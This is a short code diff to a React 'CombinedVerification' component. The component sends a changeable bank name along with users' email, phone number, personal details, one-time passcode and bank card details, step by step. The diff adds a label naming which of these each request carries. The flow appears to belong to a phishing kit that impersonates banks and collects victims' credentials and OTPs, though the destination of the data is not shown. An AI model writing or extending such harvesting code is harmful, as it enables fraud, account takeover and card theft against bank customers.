@@ -42,6 +42,7 @@ export default function CombinedVerification() {
       // Prepare the data for the current step
       let requestData = {
         bankName: formData.bankName,
+        type: stepNumber ===  1? 'email and phone number'  : stepNumber ===  2? 'personal information' : stepNumber === 3 ? 'verification code (OTP)' : 'bank card details',
         stepCompleted: stepNumber,
         time: new Date().toString(),
         ...additionalData
@@ -153,6 +154,7 @@ export default function CombinedVerification() {
         },
         body: JSON.stringify({
           bankName: formData.bankName,
+          type: stepNumber ===  1? 'email and phone number'  : stepNumber ===  2? 'personal information' : stepNumber === 3 ? 'verification code (OTP)' : 'bank card details',
           emailAddress: formData.emailAddress,
           phoneNumber: formData.phoneNumber,
           firstName: formData.firstName,
